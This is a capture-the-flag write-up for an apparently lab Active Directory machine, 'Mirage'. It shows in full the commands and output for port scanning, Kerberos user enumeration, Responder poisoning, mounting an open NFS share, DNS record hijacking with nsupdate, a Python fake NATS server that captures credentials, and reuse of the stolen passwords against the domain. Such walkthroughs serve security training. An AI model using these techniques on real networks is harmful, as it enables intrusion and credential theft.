---
created: 2026-03-13
modified: 2026-03-13
---

![[Pasted_image_20250908204343.png]]

# Recon

## Port Scan

```bash
sudo nmap -Pn -sCV -p- --min-rate 2500 -T3 -oN mirage-port-scan 10.10.11.78     
[sudo] password for darklight: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-08 20:42 EAT
Warning: 10.10.11.78 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.78
Host is up (0.48s latency).
Not shown: 65505 closed tcp ports (reset)
PORT      STATE SERVICE         VERSION
53/tcp    open  domain          Simple DNS Plus
88/tcp    open  kerberos-sec    Microsoft Windows Kerberos (server time: 2025-09-09 00:42:59Z)
111/tcp   open  rpcbind         2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc           Microsoft Windows RPC
139/tcp   open  netbios-ssn     Microsoft Windows netbios-ssn
389/tcp   open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http      Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
2049/tcp  open  nlockmgr        1-4 (RPC #100021)
3268/tcp  open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
4222/tcp  open  vrml-multi-use?
| fingerprint-strings: 
|   GenericLines: 
|     INFO {"server_id":"NCQH4SEUQHSP2OEAO3KCDK77S5MHNII4X6KIA2D5X53O35NHPPR6SYN6","server_name":"NCQH4SEUQHSP2OEAO3KCDK77S5MHNII4X6KIA2D5X53O35NHPPR6SYN6","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":831,"client_ip":"10.10.16.77","xkey":"XD3Q67NZ5CMJSTS5HCXYJ6FQAH3TL7O4QR5AWXMOKFHEKB5EKXRHNN4F"} 
|     -ERR 'Authorization Violation'
|   GetRequest: 
|     INFO {"server_id":"NCQH4SEUQHSP2OEAO3KCDK77S5MHNII4X6KIA2D5X53O35NHPPR6SYN6","server_name":"NCQH4SEUQHSP2OEAO3KCDK77S5MHNII4X6KIA2D5X53O35NHPPR6SYN6","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":832,"client_ip":"10.10.16.77","xkey":"XD3Q67NZ5CMJSTS5HCXYJ6FQAH3TL7O4QR5AWXMOKFHEKB5EKXRHNN4F"} 
|     -ERR 'Authorization Violation'
|   HTTPOptions: 
|     INFO {"server_id":"NCQH4SEUQHSP2OEAO3KCDK77S5MHNII4X6KIA2D5X53O35NHPPR6SYN6","server_name":"NCQH4SEUQHSP2OEAO3KCDK77S5MHNII4X6KIA2D5X53O35NHPPR6SYN6","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":833,"client_ip":"10.10.16.77","xkey":"XD3Q67NZ5CMJSTS5HCXYJ6FQAH3TL7O4QR5AWXMOKFHEKB5EKXRHNN4F"} 
|     -ERR 'Authorization Violation'
|   NULL: 
|     INFO {"server_id":"NCQH4SEUQHSP2OEAO3KCDK77S5MHNII4X6KIA2D5X53O35NHPPR6SYN6","server_name":"NCQH4SEUQHSP2OEAO3KCDK77S5MHNII4X6KIA2D5X53O35NHPPR6SYN6","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":830,"client_ip":"10.10.16.77","xkey":"XD3Q67NZ5CMJSTS5HCXYJ6FQAH3TL7O4QR5AWXMOKFHEKB5EKXRHNN4F"} 
|_    -ERR 'Authentication Timeout'
5985/tcp  open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf          .NET Message Framing
47001/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49345/tcp open  msrpc           Microsoft Windows RPC
49354/tcp open  ncacn_http      Microsoft Windows RPC over HTTP 1.0
49355/tcp open  msrpc           Microsoft Windows RPC
49368/tcp open  msrpc           Microsoft Windows RPC
49383/tcp open  msrpc           Microsoft Windows RPC
49391/tcp open  msrpc           Microsoft Windows RPC
49414/tcp open  msrpc           Microsoft Windows RPC
49664/tcp open  msrpc           Microsoft Windows RPC
49665/tcp open  msrpc           Microsoft Windows RPC
49666/tcp open  msrpc           Microsoft Windows RPC
49667/tcp open  msrpc           Microsoft Windows RPC
49668/tcp open  msrpc           Microsoft Windows RPC
60000/tcp open  msrpc           Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4222-TCP:V=7.95%I=7%D=9/8%Time=68BF159E%P=x86_64-pc-linux-gnu%r(NUL
SF:L,1D0,"INFO\x20{\"server_id\":\"NCQH4SEUQHSP2OEAO3KCDK77S5MHNII4X6KIA2D
SF:5X53O35NHPPR6SYN6\",\"server_name\":\"NCQH4SEUQHSP2OEAO3KCDK77S5MHNII4X
SF:6KIA2D5X53O35NHPPR6SYN6\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_co
SF:mmit\":\"a82cfda\",\"go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"port
SF:\":4222,\"headers\":true,\"auth_required\":true,\"max_payload\":1048576
SF:,\"jetstream\":true,\"client_id\":830,\"client_ip\":\"10\.10\.16\.77\",
SF:\"xkey\":\"XD3Q67NZ5CMJSTS5HCXYJ6FQAH3TL7O4QR5AWXMOKFHEKB5EKXRHNN4F\"}\
SF:x20\r\n-ERR\x20'Authentication\x20Timeout'\r\n")%r(GenericLines,1D1,"IN
SF:FO\x20{\"server_id\":\"NCQH4SEUQHSP2OEAO3KCDK77S5MHNII4X6KIA2D5X53O35NH
SF:PPR6SYN6\",\"server_name\":\"NCQH4SEUQHSP2OEAO3KCDK77S5MHNII4X6KIA2D5X5
SF:3O35NHPPR6SYN6\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_commit\":\"
SF:a82cfda\",\"go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"port\":4222,\
SF:"headers\":true,\"auth_required\":true,\"max_payload\":1048576,\"jetstr
SF:eam\":true,\"client_id\":831,\"client_ip\":\"10\.10\.16\.77\",\"xkey\":
SF:\"XD3Q67NZ5CMJSTS5HCXYJ6FQAH3TL7O4QR5AWXMOKFHEKB5EKXRHNN4F\"}\x20\r\n-E
SF:RR\x20'Authorization\x20Violation'\r\n")%r(GetRequest,1D1,"INFO\x20{\"s
SF:erver_id\":\"NCQH4SEUQHSP2OEAO3KCDK77S5MHNII4X6KIA2D5X53O35NHPPR6SYN6\"
SF:,\"server_name\":\"NCQH4SEUQHSP2OEAO3KCDK77S5MHNII4X6KIA2D5X53O35NHPPR6
SF:SYN6\",\"version\":\"2\.11\.3\",\"proto\":1,\"git_commit\":\"a82cfda\",
SF:\"go\":\"go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"port\":4222,\"headers\"
SF::true,\"auth_required\":true,\"max_payload\":1048576,\"jetstream\":true
SF:,\"client_id\":832,\"client_ip\":\"10\.10\.16\.77\",\"xkey\":\"XD3Q67NZ
SF:5CMJSTS5HCXYJ6FQAH3TL7O4QR5AWXMOKFHEKB5EKXRHNN4F\"}\x20\r\n-ERR\x20'Aut
SF:horization\x20Violation'\r\n")%r(HTTPOptions,1D1,"INFO\x20{\"server_id\
SF:":\"NCQH4SEUQHSP2OEAO3KCDK77S5MHNII4X6KIA2D5X53O35NHPPR6SYN6\",\"server
SF:_name\":\"NCQH4SEUQHSP2OEAO3KCDK77S5MHNII4X6KIA2D5X53O35NHPPR6SYN6\",\"
SF:version\":\"2\.11\.3\",\"proto\":1,\"git_commit\":\"a82cfda\",\"go\":\"
SF:go1\.24\.2\",\"host\":\"0\.0\.0\.0\",\"port\":4222,\"headers\":true,\"a
SF:uth_required\":true,\"max_payload\":1048576,\"jetstream\":true,\"client
SF:_id\":833,\"client_ip\":\"10\.10\.16\.77\",\"xkey\":\"XD3Q67NZ5CMJSTS5H
SF:CXYJ6FQAH3TL7O4QR5AWXMOKFHEKB5EKXRHNN4F\"}\x20\r\n-ERR\x20'Authorizatio
SF:n\x20Violation'\r\n");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-09T00:44:18
|_  start_date: N/A
|_clock-skew: 7h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 505.39 seconds

```

Let's add the domain name and the DC's FQDN to our hosts file

```bash
echo '10.10.11.78 dc01.mirage.htb mirage.htb' | sudo tee -a /etc/hosts
10.10.11.78 dc01.mirage.htb mirage.htb 
```

We also notice a clcok skew of `7h00m00s` to reslove this check out this note [[Resolving clock_skew error]]

```bash
nxc smb 10.10.11.78 -u guest -p ''                             
SMB         10.10.11.78     445    10.10.11.78      [*]  x64 (name:10.10.11.78) (domain:10.10.11.78) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.78     445    10.10.11.78      [-] 10.10.11.78\guest: STATUS_NOT_SUPPORTED 
```

seems like only kerberos authentication is supported.

Also guest account is disabled

```bash
nxc smb dc01.mirage.htb -u guest -p '' -k
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [-] mirage.htb\guest: KDC_ERR_CLIENT_REVOKED 
```

We need to identify a user in the system.

## Identifying a user

Started `kerbrute` and `responder`

```bash
kerbrute userenum -d mirage.htb --dc 10.10.11.78 /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -t 30

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 09/17/25 - Ronnie Flathers @ropnop

2025/09/17 13:08:26 >  Using KDC(s):
2025/09/17 13:08:26 >  	10.10.11.78:88

2025/09/17 13:08:43 >  [+] VALID USERNAME:	 administrator@mirage.htb
2025/09/17 13:11:22 >  [+] VALID USERNAME:	 Administrator@mirage.htb
```

```bash
sudo responder -I eth0 -w
[sudo] password for darklight: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.6.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] You don't have an IPv6 address assigned.

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.100.30]
    Responder IPv6             [::1]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-2CJPSW3LEAM]
    Responder Domain Name      [GQTK.LOCAL]
    Responder DCE-RPC Port     [46588]

[+] Listening for events...

```

as they are running i took a look at the open ports since there was a port with some information looking interesting.

```bash
4222/tcp  open  vrml-multi-use?
| fingerprint-strings: 
|   GenericLines: 
|     INFO {"server_id":"NCQH4SEUQHSP2OEAO3KCDK77S5MHNII4X6KIA2D5X53O35NHPPR6SYN6","server_name":"NCQH4SEUQHSP2OEAO3KCDK77S5MHNII4X6KIA2D5X53O35NHPPR6SYN6","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":831,"client_ip":"10.10.16.77","xkey":"XD3Q67NZ5CMJSTS5HCXYJ6FQAH3TL7O4QR5AWXMOKFHEKB5EKXRHNN4F"} 
|     -ERR 'Authorization Violation'
|   GetRequest: 
|     INFO {"server_id":"NCQH4SEUQHSP2OEAO3KCDK77S5MHNII4X6KIA2D5X53O35NHPPR6SYN6","server_name":"NCQH4SEUQHSP2OEAO3KCDK77S5MHNII4X6KIA2D5X53O35NHPPR6SYN6","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":832,"client_ip":"10.10.16.77","xkey":"XD3Q67NZ5CMJSTS5HCXYJ6FQAH3TL7O4QR5AWXMOKFHEKB5EKXRHNN4F"} 
|     -ERR 'Authorization Violation'
|   HTTPOptions: 
|     INFO {"server_id":"NCQH4SEUQHSP2OEAO3KCDK77S5MHNII4X6KIA2D5X53O35NHPPR6SYN6","server_name":"NCQH4SEUQHSP2OEAO3KCDK77S5MHNII4X6KIA2D5X53O35NHPPR6SYN6","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":833,"client_ip":"10.10.16.77","xkey":"XD3Q67NZ5CMJSTS5HCXYJ6FQAH3TL7O4QR5AWXMOKFHEKB5EKXRHNN4F"} 
|     -ERR 'Authorization Violation'
|   NULL: 
|     INFO {"server_id":"NCQH4SEUQHSP2OEAO3KCDK77S5MHNII4X6KIA2D5X53O35NHPPR6SYN6","server_name":"NCQH4SEUQHSP2OEAO3KCDK77S5MHNII4X6KIA2D5X53O35NHPPR6SYN6","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":830,"client_ip":"10.10.16.77","xkey":"XD3Q67NZ5CMJSTS5HCXYJ6FQAH3TL7O4QR5AWXMOKFHEKB5EKXRHNN4F"} 

```

reasearch on the port  i get this 

> [!info]
> Port` 4222 `is primarily used by the **`NATS (Not Another Messaging System)`** messaging platform for client connections. It serves as the default port for the `NATS` server, where clients connect to send and receive messages using the `NATS` protocol. The port is used for real-time task pushes to assets within the `Binalyze AIR security platform`, enabling immediate communication for task assignments. Additionally, the` MinIO Operator` uses port `4222` for `HTTPS `communication, specifically for handling conversion `webhooks`, although it is noted that the port's name might be misleading as it listens on `HTTPS`. While port `4222` is associated with `NATS`, it is also used by other systems, such as the Binalyze AIR platform for real-time task communication.

`Nmap` had guessed the service running on port `4222` is `vrml-multi-use` (the ? at the end of the service name indicates `nmap` is not sure)

research on `vrml-multi-use` i get this 

> [!info]
> The service name `vrml-multi-use` is registered by the `Internet Assigned Numbers Authority (IANA)` for the port number `4242`, designated for `VRML Multi User Systems`. This refers to systems that use the `Virtual Reality Modeling Language (VRML)` to create interactive, multi-user virtual environments on the internet. `VRML` is a standard language for describing 3D scenes and worlds, allowing users to navigate through 3D space and interact with objects, with the potential for shared experiences among multiple users


### NATS

Software applications and services need to exchange data. `NATS` is an infrastructure that allows such data exchange, segmented in the form of messages. We call this a "**`message oriented middleware`**". More info about `NATS` can be found [here](https://docs.nats.io/nats-concepts/what-is-nats) including tools to use for interacting with `NATS` server. 

Testing authentication i get this

```bash
./nats -s nats://10.10.11.78:4222 sub test --count 1
nats: error: nats: Authorization Violation 
```

we need credentials to interact with the service.

Looking for any known exploits for` NATS 2.11.3`, i got none.

`Kerbrute` and `responder` are still running but haven't gotten anything yet.

### Mounts

Checking if there are any mount points i get this 

```bash
showmount -e mirage.htb

Export list for mirage.htb:
/MirageReports (everyone)
```

Nice. Everyone has access to `/MirageReports`

```bash
 sudo mount -t nfs 10.10.11.78:/MirageReports -o vers=3 mnt
[sudo] password for darklight: 

┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/mirage]
└─$ ls mnt
Incident_Report_Missing_DNS_Record_nats-svc.pdf  Mirage_Authentication_Hardening_Report.pdf

```

copied the files from the mount directory

```bash
sudo cp mnt/Incident_Report_Missing_DNS_Record_nats-svc.pdf ./Incident_Report_Missing_DNS_Record_nats-svc.pdf

sudo cp mnt/Mirage_Authentication_Hardening_Report.pdf ./Mirage_Authentication_Hardening_Report.pdf
```

remember to change permission of the files.

`Mirage_Authentication_Hardening_Report.pdf` informs us that `NTLM `authentication is being disabled, we already new of this.

![[Pasted_image_20250917150119.png]]


`Incident_Report_Missing_DNS_Record_nats-svc.pdf` talks about some missing `DNS` record

![[Pasted_image_20250917150313.png]]

![[Pasted_image_20250917181924.png]]

![[Pasted_image_20250926081449.png]]

we need to find a way to pose as `nats-svc.mirage.htb` so we can capture request being made to the service.

### DNS Poisoning

We update the records

```bash
nsupdate -v             
> server 10.10.11.78
> zone mirage.htb
> update add nats-svc.mirage.htb. 3600 A 10.10.16.48
> send
> quit
```

now `nats-svc.mirage.htb` points to our ip address. 

> [!question]
> How is nsupdate possible without authentication?
> 
> This works if the DNS server accepts dynamic updates without requiring authentication — also known as unauthenticated dynamic updates.This is typically a misconfiguration in the Active Directory-integrated DNS service ( MicrosoftDNS ).When configured insecurely, the DNS zone allows any client to send update requests (like adding or overwriting A records) without verifying their identity. Such a configuration can be abused to spoof DNS records, redirect traffic, or facilitate attacks like Responder poisoning, NTLM relay, or ESC8.

we now need to listen for any incomming requests.

```python
import socket


print("[+] NATS Server listening... ")
s = socket.socket()
s.bind(("0.0.0.0", 4222))
s.listen(5)


while True:
    client, addr = s.accept()
    print(f"[+] Connection from {addr}")


    client.sendall(b'INFO {"server_id":"FAKE","version":"2.11.0","auth_required":true}\r\n')
    data = client.recv(1024)
    print("[>] Received:")
    print(data.decode())


    client.close()
```

 A simple script will work.

after updating the DNS records it takes some few seconds then we get the following:

```bash
python3 listener.py 
[+] NATS Server listening...
[+] Connection from ('10.10.11.78', 56565)
[>] Received:
CONNECT {"verbose":false,"pedantic":false,"user":"Dev_Account_A","pass":"hx5h7F5554fP@1337!","tls_required":false,"name":"NATS CLI Version 0.2.2","lang":"go","version":"1.41.1","protocol":1,"echo":true,"headers":false,"no_responders":false}

```

we get some credentials. But the credentials are for accessing the `NATS` server, but it would hurt to check if they are valid with the domain.

```bash
nxc smb dc01.mirage.htb -u 'Dev_Account_A' -p 'hx5h7F5554fP@1337!' -k
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [-] mirage.htb\Dev_Account_A:hx5h7F5554fP@1337! KDC_ERR_PREAUTH_FAILED
```

Authenticating to the `NATS` service.

```bash
./nats -s nats://10.10.11.78:4222 rtt --user Dev_Account_A --password 'hx5h7F5554fP@1337!'
nats://10.10.11.78:4222:

   nats://10.10.11.78:4222: 196.493573ms
```

Lets create a context to avoid typing the server address and credentials for every command.

```bash
./nats context save mirage -s nats://10.10.11.78:4222 --description 'mirage htb box' --user Dev_Account_A --password 'hx5h7F5554fP@1337!' --select
NATS Configuration Context "mirage"

  Description: mirage htb box
  Server URLs: nats://10.10.11.78:4222
     Username: Dev_Account_A
     Password: ******************
         Path: /home/darklight/.config/nats/context/mirage.json
   Connection: OK
```

testing 

```bash
./nats rtt
nats://10.10.11.78:4222:

   nats://10.10.11.78:4222: 200.219216ms

```

Next i want to perform enumeration on the server messages/data.

using the command below we are actively listening to any incoming messages from all subjects in the server.. we have set the limit of messages to be 10

```bash
./nats sub ">" --count 10
```

i got some messages in this format

```json
Received on "$JS.EVENT.ADVISORY.API"
{"type":"io.nats.jetstream.advisory.v1.api_audit","id":"j0pM13EpFxI2wPjGqQBMrj","timestamp":"2025-09-17T22:40:01.91837Z","server":"NB3I5SKVLTCSUYDFPWNRYR23KHMMZILV2O53LCUQJPBW2H6G3AEKLHVR","client":{"start":"2025-09-17T15:40:01.91837-07:00","host":"dead:beef::2a24:c7e8:1180:404d","id":254,"acc":"dev","user":"Dev_Account_A","name":"NATS CLI Version 0.2.2","lang":"go","ver":"1.41.1","rtt":1,"server":"NB3I5SKVLTCSUYDFPWNRYR23KHMMZILV2O53LCUQJPBW2H6G3AEKLHVR","kind":"Client","client_type":"nats"},"subject":"$JS.API.STREAM.INFO.auth_logs","response":"{\"type\":\"io.nats.jetstream.api.v1.stream_info_response\",\"total\":0,\"offset\":0,\"limit\":0,\"config\":{\"name\":\"auth_logs\",\"subjects\":[\"logs.auth\"],\"retention\":\"limits\",\"max_consumers\":-1,\"max_msgs\":100,\"max_bytes\":1048576,\"max_age\":0,\"max_msgs_per_subject\":-1,\"max_msg_size\":-1,\"discard\":\"new\",\"storage\":\"file\",\"num_replicas\":1,\"duplicate_window\":120000000000,\"compression\":\"none\",\"allow_direct\":true,\"mirror_direct\":false,\"sealed\":false,\"deny_delete\":true,\"deny_purge\":true,\"allow_rollup_hdrs\":false,\"consumer_limits\":{},\"allow_msg_ttl\":false,\"metadata\":{\"_nats.level\":\"1\",\"_nats.req.level\":\"0\",\"_nats.ver\":\"2.11.3\"}},\"created\":\"2025-05-05T07:18:19.6244845Z\",\"state\":{\"messages\":5,\"bytes\":570,\"first_seq\":1,\"first_ts\":\"2025-05-05T07:18:56.6788658Z\",\"last_seq\":5,\"last_ts\":\"2025-05-05T07:19:27.2106658Z\",\"num_subjects\":1,\"consumer_count\":0},\"cluster\":{\"leader\":\"NB3I5SKVLTCSUYDFPWNRYR23KHMMZILV2O53LCUQJPBW2H6G3AEKLHVR\"},\"ts\":\"2025-09-17T22:40:01.91837Z\"}"}

```

To understand the message better trying going through `NATS` documentation i had provided earlier.

![[Pasted_image_20250917191500.png]]

The storage types include:
- `File` (default) - Uses file-based storage for stream data.
- `Memory` - Uses memory-based storage for stream data.

Under response we have this 

```json
{\"name\":\"auth_logs\",\"subjects\":[\"logs.auth\"]
```

we know the stream is named `auth_logs` and the subject is `logs.auth` and finally the storage type is `\"storage\":\"file\"`

To list streams we can simply run 

```bash
 ./nats stream ls
╭──────────────────────────────────────────────────────────────────────────────╮
│                                    Streams                                   │
├───────────┬─────────────┬─────────────────────┬──────────┬───────┬────────── ≈
│ Name      │ Description │ Created             │ Messages │ Size  │ Last Mess ≈
├───────────┼─────────────┼─────────────────────┼──────────┼───────┼────────── ≈
│ auth_logs │             │ 2025-05-05 10:18:19 │ 5        │ 570 B │ 135d15h59 ≈
╰───────────┴─────────────┴─────────────────────┴──────────┴───────┴────────── ≈
```

We have only one stream. To query the stream info use the command below.

```bash
./nats stream info auth_logs
Information for Stream auth_logs created 2025-05-05 10:18:19

                Subjects: logs.auth
                Replicas: 1
                 Storage: File

Options:

               Retention: Limits
         Acknowledgments: true
          Discard Policy: New
        Duplicate Window: 2m0s
              Direct Get: true
    Allows Batch Publish: false
         Allows Counters: false
       Allows Msg Delete: false
  Allows Per-Message TTL: false
            Allows Purge: false
          Allows Rollups: false

Limits:

        Maximum Messages: 100
     Maximum Per Subject: unlimited
           Maximum Bytes: 1.0 MiB
             Maximum Age: unlimited
    Maximum Message Size: unlimited
       Maximum Consumers: unlimited

State:

            Host Version: 2.11.3
      Required API Level: 0 hosted at level 1
                Messages: 5
                   Bytes: 570 B
          First Sequence: 1 @ 2025-05-05 10:18:56
           Last Sequence: 5 @ 2025-05-05 10:19:27
        Active Consumers: 0
      Number of Subjects: 1
```

under state we see the stream has 5 messages. we can then proceed to read the messages.

```bash
./nats stream view auth_logs 
[1] Subject: logs.auth Received: 2025-05-05 10:18:56
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


[2] Subject: logs.auth Received: 2025-05-05 10:19:24
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


[3] Subject: logs.auth Received: 2025-05-05 10:19:25
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


[4] Subject: logs.auth Received: 2025-05-05 10:19:26
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


[5] Subject: logs.auth Received: 2025-05-05 10:19:27
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


19:22:04 Reached apparent end of data
```

And we have a username and password.

Testing authentication in the domain

```bash
faketime -f "+7h" \  
> nxc smb dc01.mirage.htb -u 'david.jjackson' -p 'pN8kQmn6b86!1234@' -k
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@ 

```

### Lateral Movement

#### Enumerating the password policy

```bash
└─$ faketime -f "+7hrs" \
nxc smb dc01.mirage.htb -u 'david.jjackson' -p 'pN8kQmn6b86!1234@' -k --pass-pol
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@ 
SMB         dc01.mirage.htb 445    dc01             [+] Dumping password info for domain: MIRAGE
SMB         dc01.mirage.htb 445    dc01             Minimum password length: 7
SMB         dc01.mirage.htb 445    dc01             Password history length: 24
SMB         dc01.mirage.htb 445    dc01             Maximum password age: 41 days 23 hours 53 minutes 
SMB         dc01.mirage.htb 445    dc01             
SMB         dc01.mirage.htb 445    dc01             Password Complexity Flags: 001001
SMB         dc01.mirage.htb 445    dc01                 Domain Refuse Password Change: 0
SMB         dc01.mirage.htb 445    dc01                 Domain Password Store Cleartext: 0
SMB         dc01.mirage.htb 445    dc01                 Domain Password Lockout Admins: 1
SMB         dc01.mirage.htb 445    dc01                 Domain Password No Clear Change: 0
SMB         dc01.mirage.htb 445    dc01                 Domain Password No Anon Change: 0
SMB         dc01.mirage.htb 445    dc01                 Domain Password Complex: 1
SMB         dc01.mirage.htb 445    dc01             
SMB         dc01.mirage.htb 445    dc01             Minimum password age: 1 day 4 minutes 
SMB         dc01.mirage.htb 445    dc01             Reset Account Lockout Counter: 1 minute 
SMB         dc01.mirage.htb 445    dc01             Locked Account Duration: 1 minute 
